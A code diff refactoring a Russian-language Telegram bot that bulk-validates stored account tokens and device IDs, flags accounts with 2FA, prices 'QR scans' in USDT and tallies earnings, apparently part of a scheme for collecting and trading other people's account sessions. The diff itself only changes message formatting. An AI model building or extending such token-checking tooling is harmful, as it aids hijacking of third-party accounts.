-            acc.get("device_info")
-        )
+        result = await validate_token(acc["token"], acc["device_id"], acc.get("device_info"))
         
         if result["valid"]:
             valid_count += 1
@@ -1837,35 +1775,26 @@ async def cb_check_tokens(callback: types.CallbackQuery):
             invalid_count += 1
             phone = acc.get("phone", acc_id[:8])
             error = result.get("error", "неизвестная ошибка")
-            invalid_tokens.append(f"• <code>{phone}</code>: {error}")
+            invalid_tokens.append(f"• {phone}: {error}")
             del accounts[acc_id]
         
         if checked % 5 == 0 or checked == total:
             await msg.edit_text(
-                f"🔍 Проверка: <b>{checked}</b>/{total}\n"
-                f"✅ Валидных: {valid_count}\n"
-                f"🔐 С 2FA: {twofa_count}\n"
-                f"❌ Битых: {invalid_count}",
+                f"🔍 Проверка: <b>{checked}</b>/{total}\n✅ Валидных: {valid_count}\n🔐 С 2FA: {twofa_count}\n❌ Битых: {invalid_count}",
                 parse_mode="HTML"
             )
     
     save_accounts()
     
-    text = (
-        f"📊 <b>Проверка завершена!</b>\n\n"
-        f"✅ Рабочих: <b>{valid_count}</b>\n"
-        f"🔐 С 2FA: <b>{twofa_count}</b>\n"
-        f"❌ Удалено: <b>{invalid_count}</b>\n"
-        f"📊 Осталось в базе: <b>{len(accounts)}</b>"
-    )
+    text = f"📊 <b>Проверка завершена!</b>\n\n✅ Рабочих: <b>{valid_count}</b>\n🔐 С 2FA: <b>{twofa_count}</b>\n❌ Удалено: <b>{invalid_count}</b>\n📊 Осталось в базе: <b>{len(accounts)}</b>"
     
     if twofa_list:
-        text += f"\n\n<b>🔐 Токены с 2FA:</b>\n" + "\n".join(twofa_list[:15])
+        text += "\n\n<b>🔐 Токены с 2FA:</b>\n" + "\n".join(twofa_list[:15])
         if len(twofa_list) > 15:
             text += f"\n...и ещё {len(twofa_list) - 15}"
     
     if invalid_tokens:
-        text += f"\n\n<b>❌ Удалённые токены:</b>\n" + "\n".join(invalid_tokens[:10])
+        text += "\n\n<b>❌ Удалённые токены:</b>\n" + "\n".join(invalid_tokens[:10])
         if len(invalid_tokens) > 10:
             text += f"\n...и ещё {len(invalid_tokens) - 10}"
     
@@ -1879,7 +1808,7 @@ async def cb_admin_broadcast(callback: types.CallbackQuery, state: FSMContext):
         return await callback.answer("❌ Только для админа", show_alert=True)
     
     await state.set_state(AuthState.waiting_broadcast)
-    await callback.message.answer("📢 Введите текст для рассылки всем пользователям:")
+    await safe_send_message(callback.message.chat.id, "📢 Введите текст для рассылки всем пользователям:")
     await callback.answer()
 
 @dp.message(AuthState.waiting_broadcast)
@@ -1891,12 +1820,12 @@ async def handle_broadcast(message: types.Message, state: FSMContext):
     sent = 0
     for uid in users:
         try:
-            await bot.send_message(int(uid), text)
+            await safe_send_message(int(uid), text)
             sent += 1
         except:
             pass
     
-    await message.answer(f"✅ Рассылка отправлена! Получили: <b>{sent}</b> пользователей.", parse_mode="HTML")
+    await safe_send_message(message.chat.id, f"✅ Рассылка отправлена! Получили: <b>{sent}</b> пользователей.", parse_mode="HTML")
     await state.clear()
 
 @dp.callback_query(F.data == "admin_price")
@@ -1905,11 +1834,8 @@ async def cb_admin_price(callback: types.CallbackQuery, state: FSMContext):
         return await callback.answer("❌ Только для админа", show_alert=True)
     
     await state.set_state(AuthState.waiting_new_price)
-    await callback.message.answer(
-        f"💵 Текущая цена: <b>${PRICE_PER_QR:.2f}</b>\n\n"
-        f"Введите новую цену в USDT (например 3.50):",
-        parse_mode="HTML"
-    )
+    text = f"💵 Текущая цена: <b>${PRICE_PER_QR:.2f}</b>\n\nВведите новую цену в USDT (например 3.50):"
+    await safe_send_message(callback.message.chat.id, text, parse_mode="HTML")
     await callback.answer()
 
 @dp.message(AuthState.waiting_new_price)
@@ -1920,18 +1846,19 @@ async def handle_new_price(message: types.Message, state: FSMContext):
     try:
         new_price = float(message.text.strip())
     except:
-        await message.answer("❌ Введите число (например 3.50)")
+        await safe_send_message(message.chat.id, "❌ Введите число (например 3.50)")
         return
     
     if new_price <= 0:
-        await message.answer("❌ Цена должна быть больше 0")
+        await safe_send_message(message.chat.id, "❌ Цена должна быть больше 0")
         return
     
     global PRICE_PER_QR
     old_price = PRICE_PER_QR
     PRICE_PER_QR = new_price
     
-    await message.answer(f"✅ Цена изменена!\n\nСтарая: <b>${old_price:.2f}</b>\nНовая: <b>${new_price:.2f}</b>", parse_mode="HTML")
+    text = f"✅ Цена изменена!\n\nСтарая: <b>${old_price:.2f}</b>\nНовая: <b>${new_price:.2f}</b>"
+    await safe_send_message(message.chat.id, text, parse_mode="HTML")
     await state.clear()
 
 @dp.callback_query(F.data == "admin_stats")
@@ -1945,17 +1872,9 @@ async def cb_admin_stats(callback: types.CallbackQuery):
     total_scans = sum(g.get("total_scans", 0) for g in groups.values())
     total_earned = sum(u.get("total_scans", 0) * PRICE_PER_QR for u in users.values())
     
-    text = (
-        f"📊 <b>Статистика</b>\n\n"
-        f"👥 Пользователей: <b>{total_users}</b>\n"
-        f"👥 Групп: <b>{total_groups}</b>\n"
-        f"📱 Аккаунтов: <b>{total_accounts}</b>\n"
-        f"📷 Всего сканов: <b>{total_scans}</b>\n"
-        f"💰 Заработано: <b>${total_earned:.2f}</b>\n"
-        f"💎 Цена QR: <b>${PRICE_PER_QR:.2f}</b>"
-    )
+    text = f"📊 <b>Статистика</b>\n\n👥 Пользователей: <b>{total_users}</b>\n👥 Групп: <b>{total_groups}</b>\n📱 Аккаунтов: <b>{total_accounts}</b>\n📷 Всего сканов: <b>{total_scans}</b>\n💰 Заработано: <b>${total_earned:.2f}</b>\n💎 Цена QR: <b>${PRICE_PER_QR:.2f}</b>"
     
-    await callback.message.answer(text, parse_mode="HTML")
+    await safe_send_message(callback.message.chat.id, text, parse_mode="HTML")
     await callback.answer()
 
 # ==================== ЗАПУСК ====================
@@ -1966,7 +1885,6 @@ async def main():
     logger.info(f"Загружено пользователей: {len(users)}")
     logger.info(f"Загружено групп: {len(groups)}")
     
-    # Автосохранение каждые 5 минут
     async def auto_save():
         while True:
             await asyncio.sleep(300)
